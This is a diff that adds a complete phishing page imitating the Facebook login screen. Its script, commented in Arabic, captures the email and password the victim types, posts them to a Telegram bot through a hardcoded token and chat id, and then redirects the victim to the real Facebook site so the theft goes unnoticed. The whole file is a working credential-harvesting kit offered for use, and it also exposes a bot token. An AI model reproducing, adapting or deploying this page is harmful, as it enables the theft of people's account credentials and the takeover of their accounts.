@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in to Facebook</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      background-color: #ffffff;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      text-align: center;
+    }
+    .facebook-logo {
+      font-size: 36px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .login-form input {
+      width: 100%;
+      height: 40px;
+      margin-bottom: 15px;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+      padding: 0 10px;
+      font-size: 16px;
+    }
+    .login-form button {
+      width: 100%;
+      height: 40px;
+      border: none;
+      background-color: #1877f2;
+      color: #ffffff;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-form button:hover {
+      background-color: #165cdb;
+    }
+    .links {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #1877f2;
+    }
+    .links a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .create-account {
+      margin-top: 20px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #1877f2;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="facebook-logo">facebook</div>
+    <div class="login-form">
+      <form id="loginForm">
+        <input type="text" id="email" placeholder="Email or Phone Number" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+      <div class="links">
+        <a href="https://www.facebook.com/login/identify" target="_blank">Forgotten password?</a>
+      </div>
+      <div class="create-account">
+        <a href="https://www.facebook.com/r.php" target="_blank">Create New Account</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // معرف البوت الخاص بك من BotFather
+    const botToken = "7376961577:AAERz_JvjbYCcXsLU6M0p3pGZOkGdBH29R4";
+    // معرف المحادثة (chat_id) الخاصة بك
+    const chatId = "7336862021";
+
+    // الاستماع لحدث الإرسال
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+      // جلب البيانات المُدخلة
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // رسالة سيتم إرسالها للبوت
+      const message = `🔐 تسجيل دخول جديد:\n\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}`;
+
+      // إرسال البيانات إلى بوت Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          // إعادة التوجيه للصفحة الحقيقية
+          window.location.href = "https://www.facebook.com";
+        } else {
+          alert("حدث خطأ أثناء الإرسال!");
+        }
+      })
+      .catch(error => {
+        alert("تعذر الإرسال: " + error);
+      });
+    });
+  </script>
+</body>
+</html>
